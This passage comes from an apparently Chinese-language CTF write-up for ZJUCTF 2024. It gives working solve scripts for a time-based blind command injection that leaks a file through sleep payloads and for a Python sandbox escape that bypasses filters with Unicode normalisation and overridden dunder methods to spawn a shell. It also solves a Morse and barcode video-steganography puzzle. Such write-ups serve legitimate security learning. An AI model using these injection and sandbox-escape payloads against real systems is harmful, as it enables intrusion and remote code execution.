io.sendline(cmd.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;$ &quot;</span>)<br>    t2 = time.time()<br>    <span class="hljs-keyword">return</span> t2-t1<br><br>ans = <span class="hljs-string">&quot;&quot;</span><br>ans_len = <span class="hljs-number">0</span><br>cmd = <span class="hljs-string">&quot;cat /ea*&quot;</span>   <span class="hljs-comment"># &quot;ls /| tr &#x27;\\n&#x27; &#x27; &#x27;&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    ans_len+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> strings:<br>        payload = <span class="hljs-string">f&#x27;&#x27;&#x27;sleep $( [ &quot;$(<span class="hljs-subst">&#123;cmd&#125;</span> | head -c <span class="hljs-subst">&#123;ans_len&#125;</span> | tail -c 1)&quot; = &quot;<span class="hljs-subst">&#123;i&#125;</span>&quot; ] &amp;&amp; echo 1)&#x27;&#x27;&#x27;</span><br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(payload)&lt;<span class="hljs-number">80</span><br>        <span class="hljs-comment"># print(payload)</span><br>        <span class="hljs-keyword">if</span> sendcommand(payload)&gt;<span class="hljs-number">0.5</span>:<br>            <span class="hljs-keyword">if</span> ans_len!=<span class="hljs-number">2</span> <span class="hljs-keyword">and</span> ans[-<span class="hljs-number">2</span>:]==i*<span class="hljs-number">2</span>:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">else</span>:<br>                ans+=i<br>                <span class="hljs-built_in">print</span>(ans)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <br>io.interactive()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/6.png"></p></li><li><p>发现flag很长，但是难不倒我们的<code>cat /ea*</code>大人,把脚本中的cmd改成<code>cat /ea*</code>运行即可：</p><p><img src="/img/zjuctf2024/7.png"></p></li></ul><h2 id="pep672">pep672</h2><ul><li><p>个人认为是一道很精彩的沙箱题目(如果之前没做过类似的话)，首先出题人过滤了ascii的数字和字母，结合题目名字<code>pep72</code>去搜索相关资料，是Unicode字符规范绕过。由于之前做过类似的web题目，根据<a href="https://www.compart.com/en/unicode/">网址</a>可以找到大部分绕过的字母： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">normal = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzT&quot;</span><br>abnormal = <span class="hljs-string">&quot;ᵃᵇᶜᵈᵉᶠᵍʰⁱʲᵏˡᵐⁿᵒᵖ𝗊ʳˢᵗᵘᵛʷˣʸᶻᵀ&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">genstr</span>(<span class="hljs-params">s</span>):<br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> normal:<br>            res+=abnormal[normal.index(i)]<br>        <span class="hljs-keyword">else</span>:<br>            res+=i<br>    <span class="hljs-keyword">return</span> res<br></code></pre></td></tr></table></figure></p></li><li><p>绕过了字母但是仍没有办法输入字符串（<code>__import__('os')</code> 等指令内是要传入正常的字符串的 ），于是考虑用True当作数字，并用chr函数得到正常字符串： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">factor</span>(<span class="hljs-params">x</span>):<br>    res = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-built_in">int</span>(math.sqrt(x)) + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> x % i:<br>            x /= i<br>            res.append(i)<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">1</span>:<br>        res.append(x)<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_num</span>(<span class="hljs-params">x</span>):<br>    res = <span class="hljs-string">&quot;True&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(x) - <span class="hljs-number">1</span>):<br>        res += <span class="hljs-string">&quot;+True&quot;</span><br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_payload</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">if</span> x == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;False&quot;</span><br>    <span class="hljs-keyword">if</span> x == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;True&quot;</span><br>    res = factor(x)<br>    payload = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> ind, i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(res):<br>        <span class="hljs-keyword">if</span> ind == <span class="hljs-number">0</span>:<br>            payload = <span class="hljs-string">f&quot;(<span class="hljs-subst">&#123;gen_num(i)&#125;</span>)&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            payload += <span class="hljs-string">f&quot;*(<span class="hljs-subst">&#123;gen_num(i)&#125;</span>)&quot;</span><br>    <span class="hljs-keyword">return</span> payload<br><br>normal = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzT&quot;</span><br>abnormal = <span class="hljs-string">&quot;ᵃᵇᶜᵈᵉᶠᵍʰⁱʲᵏˡᵐⁿᵒᵖ𝗊ʳˢᵗᵘᵛʷˣʸᶻᵀ&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">genstr</span>(<span class="hljs-params">s</span>):<br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> normal:<br>            res+=abnormal[normal.index(i)]<br>        <span class="hljs-keyword">else</span>:<br>            res+=i<br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_num</span>(<span class="hljs-params">x</span>):<br>    res = <span class="hljs-string">&quot;True&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(x) - <span class="hljs-number">1</span>):<br>        res += <span class="hljs-string">&quot;+True&quot;</span><br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">formatwithstr</span>(<span class="hljs-params">s</span>):<br>    news = <span class="hljs-string">&quot;&quot;</span><br>    index = <span class="hljs-number">0</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(s):<br>        <span class="hljs-keyword">if</span> s[i]==<span class="hljs-string">&quot;&#x27;&quot;</span>:<br>            i+=<span class="hljs-number">1</span><br>            tmp = <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-keyword">while</span> s[i]!=<span class="hljs-string">&quot;&#x27;&quot;</span>:<br>                tmp+=s[i]<br>                i+=<span class="hljs-number">1</span><br>            <span class="hljs-comment"># print(tmp)</span><br>            var = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;normal[index]&#125;</span>=chr(<span class="hljs-subst">&#123;gen_payload(<span class="hljs-built_in">ord</span>(tmp[<span class="hljs-number">0</span>]))&#125;</span>)&quot;</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> tmp[<span class="hljs-number">1</span>:]:<br>                var+= <span class="hljs-string">f&quot;+chr(<span class="hljs-subst">&#123;gen_payload(<span class="hljs-built_in">ord</span>(j))&#125;</span>)&quot;</span><br>            var+=<span class="hljs-string">&quot;;&quot;</span><br>            news = var+news+normal[index]<br>            index+=<span class="hljs-number">1</span><br>            tmp = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            news+=s[i]<br>        i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> news<br><br>cmd = <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span><br><span class="hljs-built_in">print</span>(genstr(formatwithstr(cmd)))<br></code></pre></td></tr></table></figure> 此时得到的输入除了左括号以外都绕过了: <img src="/img/zjuctf2024/8.png"></p></li><li><p>问题就出在左括号上，尝试了很多方法都无法绕过，包括特殊的unicode字符，都无法实现。直到我在网上看到了一些<a href="https://tttang.com/archive/1397/#toc_python">wp</a>，里面提到了嵌套装饰器绕过括号，尝试在exec内部再次执行exec(input())来绕过所有限制，但是很遗憾，无法绕过空格了： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">code = <span class="hljs-string">&quot;@exec\n@input\nclass x:pass&quot;</span><br><span class="hljs-built_in">exec</span>(code)<br></code></pre></td></tr></table></figure></p></li><li><p>然后看到wp的后半部分，更改了<code>reprlib.Repr.__getitem__=exec</code>，是某个类的某个方法并且可以调用<code>a=reprlib.aRepr;a["print('whoami')"]</code>,但是首先我们没有中括号，那么就找不是__getitem__方法的(比如__add__);其次问题在于reprlib.Repr需要import，但是我们只有<code>import reprlib.Repr</code>和<code>__import__('reprlib.Repr')</code>，两种都被限制，就只能找不用import也能调用的类；</p></li><li><p>__add__相关方法在由c实现的class类型中是不能被更改的，于是运行脚本找到能用的库： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__():<br><span class="hljs-keyword">try</span>:<br>    i.__add__ = <span class="hljs-built_in">exec</span><br>    <span class="hljs-built_in">print</span>(i)<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure></p></li><li><p>最后的任务是找不用import就能调用的类（我是用vscode每输入一个字符然后tab找的。。。），发现关键在于<code>__loader__</code>，它的类型是<code>&lt;class '_frozen_importlib_external.SourceFileLoader'&gt;</code>！ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">li = [<span class="hljs-literal">Ellipsis</span>,<span class="hljs-literal">NotImplemented</span>,EnvironmentError,IOError,__file__,__annotations__,__build_class__,__builtins__,__cached__,__doc__,<span class="hljs-built_in">__import__</span>,__loader__,__name__,__package__,__spec__]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> li:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(i.__class__)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure></p></li><li><p>题目已经接近尾声，我们需要改exec和input两个方法，但是只有一种类型，所以需要对一种单目运算方法进行修改：<code>a=__loader__;a.__class__.__pos__=input;a.__class__.__and__=exec;b=+a;a&amp;b</code></p></li><li><p>孩子们，终于拿到flag了： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">51954</span>)<br>cmd = <span class="hljs-string">&quot;a=__loader__;a.__class__.__pos__=input;a.__class__.__and__=exec;b=+a;a&amp;b&quot;</span><br>io.sendline(genstr(cmd))<br>cmd = <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)&quot;</span><br>io.sendline(cmd)<br>io.interactive()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/9.png"></p></li></ul><h2 id="锅里捞面">锅里捞面</h2><ul><li><p>稍微看了一眼hint，发现是以窗帘的开关时长作为摩斯电码来解密。下载附件是一个视频，在视频中，每隔一段时间就会有嘟嘟嘟的电报声，猜测是摩斯电码，用Au查看音轨: <img src="/img/zjuctf2024/30.png"></p></li><li><p>人工一个个看过来，长短代表摩斯电码的长短，得到最后的结果并解码: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">MORSE_CODE_DICT = &#123;<br>    <span class="hljs-string">&#x27;A&#x27;</span>: <span class="hljs-string">&#x27;.-&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>: <span class="hljs-string">&#x27;-...&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>: <span class="hljs-string">&#x27;-.-.&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>: <span class="hljs-string">&#x27;-..&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>: <span class="hljs-string">&#x27;.&#x27;</span>, <br>    <span class="hljs-string">&#x27;F&#x27;</span>: <span class="hljs-string">&#x27;..-.&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>: <span class="hljs-string">&#x27;--.&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>: <span class="hljs-string">&#x27;....&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>: <span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;J&#x27;</span>: <span class="hljs-string">&#x27;.---&#x27;</span>, <br>    <span class="hljs-string">&#x27;K&#x27;</span>: <span class="hljs-string">&#x27;-.-&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>: <span class="hljs-string">&#x27;.-..&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>: <span class="hljs-string">&#x27;--&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>: <span class="hljs-string">&#x27;-.&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>: <span class="hljs-string">&#x27;---&#x27;</span>, <br>    <span class="hljs-string">&#x27;P&#x27;</span>: <span class="hljs-string">&#x27;.--.&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>: <span class="hljs-string">&#x27;--.-&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>: <span class="hljs-string">&#x27;.-.&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>: <span class="hljs-string">&#x27;...&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>: <span class="hljs-string">&#x27;-&#x27;</span>, <br>    <span class="hljs-string">&#x27;U&#x27;</span>: <span class="hljs-string">&#x27;..-&#x27;</span>, <span class="hljs-string">&#x27;V&#x27;</span>: <span class="hljs-string">&#x27;...-&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>: <span class="hljs-string">&#x27;.--&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>: <span class="hljs-string">&#x27;-..-&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>: <span class="hljs-string">&#x27;-.--&#x27;</span>, <br>    <span class="hljs-string">&#x27;Z&#x27;</span>: <span class="hljs-string">&#x27;--..&#x27;</span>,<br>    <span class="hljs-string">&#x27;1&#x27;</span>: <span class="hljs-string">&#x27;.----&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>: <span class="hljs-string">&#x27;..---&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>: <span class="hljs-string">&#x27;...--&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>: <span class="hljs-string">&#x27;....-&#x27;</span>, <br>    <span class="hljs-string">&#x27;5&#x27;</span>: <span class="hljs-string">&#x27;.....&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>: <span class="hljs-string">&#x27;-....&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>: <span class="hljs-string">&#x27;--...&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>: <span class="hljs-string">&#x27;---..&#x27;</span>, <br>    <span class="hljs-string">&#x27;9&#x27;</span>: <span class="hljs-string">&#x27;----.&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>: <span class="hljs-string">&#x27;-----&#x27;</span>,<br>    <span class="hljs-string">&#x27; &#x27;</span>: <span class="hljs-string">&#x27;/&#x27;</span><br>&#125;<br>reversed_morse_dict = &#123;value: key <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> MORSE_CODE_DICT.items()&#125;<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>tmp = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readlines():<br>    tmp+=reversed_morse_dict[i[:-<span class="hljs-number">1</span>]]<br><span class="hljs-built_in">print</span>(tmp,<span class="hljs-built_in">len</span>(tmp))<br></code></pre></td></tr></table></figure></p></li><li><p>猜测摩斯电码揭秘结果是base36加密，但是我们没有base36加密对应的表，偶然间结合视频题目代号128，猜测是视频中还隐藏了C128条形码，是base36加密对应的表。但是音频已经揭秘过了，于是猜测条形码隐藏在图片帧中，写脚本比对每一帧与第一帧图片的每个像素，果然发现了猫腻(比对代码是GPT生成的，懒得写qwq): <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># 设置输入视频路径和输出图片保存路径</span><br>video_path = <span class="hljs-string">&#x27;128.mp4&#x27;</span><br>output_dir = <span class="hljs-string">&#x27;frames&#x27;</span><br><br><span class="hljs-comment"># 如果输出文件夹不存在，创建它</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(output_dir):<br>    os.makedirs(output_dir)<br><br><span class="hljs-comment"># 打开视频文件</span><br>cap = cv2.VideoCapture(video_path)<br><br><span class="hljs-comment"># 读取视频的第一帧作为基准帧</span><br>ret, first_frame = cap.read()<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ret:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;无法读取视频文件&quot;</span>)<br>    cap.release()<br>    exit()<br><br><span class="hljs-comment"># 将第一帧保存为图片</span><br>first_frame_path = os.path.join(output_dir, <span class="hljs-string">&#x27;frame_0.jpg&#x27;</span>)<br>cv2.imwrite(first_frame_path, first_frame)<br><br><span class="hljs-comment"># 将第一帧转换为灰度图像</span><br>gray_first_frame = cv2.cvtColor(first_frame, cv2.COLOR_BGR2GRAY)<br><br><span class="hljs-comment"># 设置帧差异的阈值，用来判断帧之间的差异</span><br>threshold = <span class="hljs-number">0.8</span><br><br><span class="hljs-comment"># 初始化帧计数器</span><br>frame_counter = <span class="hljs-number">1</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 逐帧读取视频</span><br>    ret, frame = cap.read()<br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ret:<br>        <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 如果没有更多的帧，退出循环</span><br>    <br>    <span class="hljs-comment"># 将当前帧转换为灰度图像</span><br>    gray_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)<br>    <br>    <span class="hljs-comment"># 计算与第一帧的差异</span><br>    frame_diff = cv2.absdiff(gray_first_frame, gray_frame)<br>    <br>    <span class="hljs-comment"># 计算帧差异的平均值</span><br>    diff_mean = np.mean(frame_diff)<br>    <br>    <span class="hljs-comment"># 如果差异大于设定的阈值，保存该帧为图片</span><br>    <span class="hljs-keyword">if</span> diff_mean &gt; threshold:<br>        frame_filename = <span class="hljs-string">f&#x27;frame_<span class="hljs-subst">&#123;frame_counter&#125;</span>.jpg&#x27;</span><br>        frame_path = os.path.join(output_dir, frame_filename)<br>        cv2.imwrite(frame_path, frame)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;保存帧: <span class="hljs-subst">&#123;frame_filename&#125;</span>, 差异值: <span class="hljs-subst">&#123;diff_mean&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># 更新帧计数器</span><br>    frame_counter += <span class="hljs-number">1</span><br><br><span class="hljs-comment"># 释放视频捕获对象</span><br>cap.release()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;处理完成！&quot;</span>)<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/31.png"></p></li><li><p>某些帧存储了条形码对应的信息，按帧排序，同时出现的白色照片张数就是该为条形码的编码值，写脚本读取并解析: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_columns_as_lists</span>(<span class="hljs-params">image_path</span>):<br>    <span class="hljs-keyword">if</span> os.path.exists(image_path):<br>        image = cv2.imread(image_path, cv2.IMREAD_GRAYSCALE)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <br>    width = image.shape[<span class="hljs-number">1</span>]<br>    columns_pixel_values = []<br>    <span class="hljs-keyword">for</span> col_index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        column_pixels = image[:, col_index].tolist()<br>        columns_pixel_values.append(column_pixels[<span class="hljs-number">68</span>:-<span class="hljs-number">68</span>])<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> columns_pixel_values:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span>(i)&lt;<span class="hljs-number">10000</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">sum</span>(i)&gt;<span class="hljs-number">27000</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>lis = <span class="hljs-string">&quot;&quot;</span><br>last = <span class="hljs-literal">None</span><br>leng = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">172790</span>):<br>    color = extract_columns_as_lists(<span class="hljs-string">f&quot;./frames/frame_<span class="hljs-subst">&#123;i&#125;</span>.jpg&quot;</span>)<br>    <span class="hljs-keyword">if</span> color != <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">if</span> last==<span class="hljs-literal">None</span>:<br>            last = color<br>            